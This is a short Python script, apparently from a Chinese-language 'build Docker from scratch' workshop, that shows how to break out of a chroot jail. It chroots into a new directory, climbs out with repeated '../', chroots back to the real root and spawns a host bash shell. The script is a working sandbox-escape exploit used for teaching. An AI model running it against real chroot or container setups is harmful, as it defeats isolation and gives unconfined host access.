#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""从零实现 Docker 工作坊 - 逃逸脚本。
"""

import os

# 创建一个目录并 chroot 到里面，但我们不想 chdir 到这个目录
os.makedirs('.foo')
os.chroot('.foo')

# pwd 仍然持有（新）chroot 外部目录的引用，所以 chdir
# 到 pwd 上方的目录。
# kernel 会自动把额外的 ../ 转换为 /
os.chdir('../../../../../../../../')

# 最后 chroot 到旧的（最顶层）root
os.chroot('.')

# 现在可以在 host 中 exec 一个 shell
os.execv('/bin/bash', ['/bin/bash'])
